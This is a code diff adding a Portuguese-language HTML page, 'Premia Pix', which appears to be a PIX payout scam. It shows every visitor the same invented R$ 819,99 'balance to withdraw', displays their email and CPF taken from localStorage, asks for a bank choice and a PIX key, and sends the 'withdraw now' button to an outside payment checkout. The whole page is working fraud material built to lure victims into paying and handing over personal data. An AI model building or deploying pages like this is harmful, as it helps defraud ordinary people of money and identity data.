@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premia Pix</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+    <main>
+        <div class="containerPages" style="height: 100%;">
+            <div class="header">
+                <div class="topHeader" style="margin-top: 2vh;">
+                    <div class="leftHeader">
+                        <img src="images/insta-pix-logo.webp" alt="" style="height: 31px; width: 180px;">
+                    </div>
+                    <div class="rightHeader">
+                        <div style="display: flex; justify-content: center; align-items: center; flex-direction: column;">                         
+                            <b>Saldo a receber</b>
+                            <span style="display: flex; justify-content: center; align-items: center;background-color: #00BDAE; border-radius: 10px;padding: 2px;font-size: 15px;">
+                                R$ 819,99<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-dollar-sign ml-2 size-4"><circle cx="12" cy="12" r="10"></circle><path d="M16 8h-6a2 2 0 1 0 0 4h4a2 2 0 1 1 0 4H8"></path><path d="M12 18V6"></path></svg>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+                <div class="lowestHeader">
+                    <div class="leftHeader">
+                        <svg width="15" height="15" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg" class="size-4 mr-2"><path d="M7.5 0.875C5.49797 0.875 3.875 2.49797 3.875 4.5C3.875 6.15288 4.98124 7.54738 6.49373 7.98351C5.2997 8.12901 4.27557 8.55134 3.50407 9.31167C2.52216 10.2794 2.02502 11.72 2.02502 13.5999C2.02502 13.8623 2.23769 14.0749 2.50002 14.0749C2.76236 14.0749 2.97502 13.8623 2.97502 13.5999C2.97502 11.8799 3.42786 10.7206 4.17091 9.9883C4.91536 9.25463 6.02674 8.87499 7.49995 8.87499C8.97317 8.87499 10.0846 9.25463 10.8291 9.98831C11.5721 10.7206 12.025 11.8799 12.025 13.5999C12.025 13.8623 12.2376 14.0749 12.5 14.0749C12.7623 14.075 12.975 13.8623 12.975 13.6C12.975 11.72 12.4778 10.2794 11.4959 9.31166C10.7244 8.55135 9.70025 8.12903 8.50625 7.98352C10.0187 7.5474 11.125 6.15289 11.125 4.5C11.125 2.49797 9.50203 0.875 7.5 0.875ZM4.825 4.5C4.825 3.02264 6.02264 1.825 7.5 1.825C8.97736 1.825 10.175 3.02264 10.175 4.5C10.175 5.97736 8.97736 7.175 7.5 7.175C6.02264 7.175 4.825 5.97736 4.825 4.5Z" fill="currentColor" fill-rule="evenodd" clip-rule="evenodd"></path></svg>
+                        <span id="emailDisplay"></span>
+                    </div>
+                    <div class="rightHeader">
+                        <p><b>CPF:</b> <span id="cpfDisplay"></span></p>
+                    </div>
+                </div>
+            </div>
+            <div class="areas" style="padding-right: 5vh;">
+                <div style="box-shadow: 2px 11px 36px -8px rgba(0,0,0,0.47);
+                -webkit-box-shadow: 2px 11px 36px -8px rgba(0,0,0,0.47);
+                -moz-box-shadow: 2px 11px 36px -8px rgba(0,0,0,0.47);color:black;background-color: #FFFFFF;border-radius: 10px;display: flex; justify-content: center;align-items: center;text-align: center;width: 80%; padding: 20px;font-size: 14px;margin-left: 5vh;margin-top: 5vh;">
+                    <b>Realize agora seu saque de R$ 819,99</b>
+                </div>
+                <div class="bandeiras" style="margin-top: 5vh;">
+                    <b style="margin-right: 5vh;">Selecione seu banco abaixo:</b>
+                    <div class="cardBandeiras">
+                        <div class="cardBandeira">
+                            <img src="images/bb.webp" alt="" style="border-radius: 10px;width: 50px; height: 50px;">
+                        </div>
+                        <div class="cardBandeira">
+                            <img src="images/caixa.webp" alt="" style="border-radius: 10px;width: 50px; height: 50px;">
+                        </div>
+                        <div class="cardBandeira">
+                            <img src="images/nubank.webp" alt="" style="border-radius: 10px;width: 50px; height: 50px;">
+                        </div>
+                        <div class="cardBandeira">
+                            <img src="images/itau.webp" alt="" style="border-radius: 10px;width: 50px; height: 50px;">
+                        </div>
+                        <div class="cardBandeira">
+                            <img src="images/inter.webp" alt="" style="border-radius: 10px;width: 50px; height: 50px;">
+                        </div>
+                        <div class="cardBandeira">
+                            <img src="images/picpay.webp" alt="" style="border-radius: 10px;width: 50px; height: 50px;">
+                        </div>
+                        <div class="cardBandeira">
+                            <img src="images/bradesco.webp" alt="" style="border-radius: 10px;width: 50px; height: 50px;">
+                        </div>
+                        <div class="cardBandeira">
+                            <img src="images/outro.webp" alt="" style="border-radius: 10px;width: 50px; height: 50px;">
+                        </div>
+                    </div>
+                </div>
+                <div class="areas" style="display: flex;justify-content: center; align-items: center;flex-direction: row;margin-top: 5vh;margin-left: 3vh;">
+                    <img src="images/icon-pix-white.webp" alt="" style="width: 15px; height: 15px;margin-right: 1vh;">
+                    Selecione sua chave PIX
+                </div>
+                <div class="areas" style="display: flex; justify-content: center;align-items: center;flex-direction: row;margin-top: 2vh;flex-wrap: wrap;margin-left: 5vh;">
+                    <div class="cardChave" style="width: 100px; height: 50px;border-radius: 10px;background-color: #FFFFFF;display: flex; justify-content: center;align-items: center;flex-direction: column;">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5 lucide lucide-smartphone text-zinc-900"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"></rect><path d="M12 18h.01"></path></svg>
+                        <b style="margin-top: 1vh;">Celular</b>
+                    </div>
+                    <div class="cardChave"style="width: 100px; height: 50px;border-radius: 10px;background-color: #FFFFFF;display: flex; justify-content: center;align-items: center;flex-direction: column; margin-left:1vh;">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5 lucide lucide-smartphone text-zinc-900"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"></path><path d="M14 2v4a2 2 0 0 0 2 2h4"></path></svg>
+                        <b style="margin-top: 1vh;">CPF</b>
+                    </div>
+                    <div class="cardChave"style="width: 100px; height: 50px;border-radius: 10px;background-color: #FFFFFF;display: flex; justify-content: center;align-items: center;flex-direction: column; margin-left:1vh;">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5 lucide lucide-smartphone text-zinc-900"><rect width="20" height="16" x="2" y="4" rx="2"></rect><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path></svg>
+                        <b style="margin-top: 1vh;">E-mail</b>
+                    </div>
+                    <div class="cardChave"style="width: 100px; height: 50px;border-radius: 10px;background-color: #FFFFFF;display: flex; justify-content: center;align-items: center;flex-direction: column; margin-left:1vh;">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5 lucide lucide-smartphone text-zinc-900"><path d="M2 18v3c0 .6.4 1 1 1h4v-3h3v-3h2l1.4-1.4a6.5 6.5 0 1 0-4-4Z"></path><circle cx="16.5" cy="7.5" r=".5" fill="currentColor"></circle></svg>                        
+                        <b style="margin-top: 1vh;">Aleatória</b>
+                    </div>
+                </div>
+                <div class="areas">
+                    <div style="width: 80%;margin-left: 10vh;">
+                        <div style="display: flex; justify-content: center;align-items: center;text-align: center;width: 86%;margin-top: 2vh;">
+                            <input type="text" id="inputCpf" placeholder="Digite sua chave" 
+                                   style="border-radius: 10px;padding: 5px; width: 100%;height: 44px;" 
+                                   required>
+                        </div>
+                        <div style="display: flex; justify-content: center;align-items: center;text-align: center;width: 86%;margin-top: 2vh;">
+                            <a href="https://go.tribopay.com/wshap" style="display: flex; justify-content: center;align-items: center;text-align: center;width: 100%;color: #FFFFFF;cursor: pointer;text-decoration: none;">
+                                <button style="background-color: #005952;display: flex; justify-content: center;align-items: center;text-align: center;width: 100%;color: #FFFFFF;border-radius: 10px;padding: 5px;height: 50px;cursor: pointer;">
+                                    Realizar saque agora
+                                </button>
+                            </a>
+        
+                        </div>
+                        <div style="color: gray;margin-top: 5vh;display: flex; justify-content: center;align-items: center;text-align: center;margin-right: 10vh;">
+                            2024 © Insta PIX
+                        </div>
+                    </div>
+                </div>               
+            </div>
+
+        </div>
+    </main>
+    <div id="infoModal" class="modal-saque">
+        <div class="modal-content-saque">
+            <span class="close-saque" id="closeModal">&times;</span>
+            <h2>Valor do Saque Disponível</h2>
+            <p> R$ 819,99</p>
+        </div>
+    </div>
+    <script>
+        function showModal() {
+            const modal = document.getElementById('infoModal');
+            modal.style.display = 'block'; // Exibe o modal
+
+            // Fecha o modal após 5 segundos
+            setTimeout(() => {
+                hideModal();
+            }, 5000);
+        }
+
+        // Função para esconder o modal
+        function hideModal() {
+            const modal = document.getElementById('infoModal');
+            modal.style.display = 'none'; // Esconde o modal
+        }
+
+        // Adiciona evento de clique para fechar o modal
+        document.getElementById('closeModal').onclick = hideModal;
+
+        // Exibe o modal ao carregar a página
+        window.onload = function() {
+            loadUserData(); // Carrega dados do localStorage
+            showModal(); // Mostra o modal
+        };
+        // Função para obter e exibir dados do localStorage
+        function loadUserData() {
+            const email = localStorage.getItem('email');
+            const cpf = localStorage.getItem('cpf');
+
+            if (email) {
+                document.getElementById('emailDisplay').textContent = email;
+            }
+
+            if (cpf) {
+                document.getElementById('cpfDisplay').textContent = cpf;
+            }
+        }
+    </script>             
+    <script>
+        const bandeiras = document.querySelectorAll('.cardBandeira');
+    
+        bandeiras.forEach(bandeira => {
+            bandeira.addEventListener('click', () => {
+                // Remove a classe 'selected' de todas as bandeiras
+                bandeiras.forEach(b => b.classList.remove('selected'));
+    
+                // Adiciona a classe 'selected' à bandeira clicada
+                bandeira.classList.add('selected');
+            });
+        });
+        const cardsChave = document.querySelectorAll('.cardChave');
+
+        cardsChave.forEach(card => {
+            card.addEventListener('click', () => {
+                // Remove a classe 'selected' de todas as cards
+                cardsChave.forEach(c => c.classList.remove('selectChave'));
+
+                // Adiciona a classe 'selected' à card clicada
+                card.classList.add('selectChave');
+            });
+        });
+    </script>
+</body>
+</html>
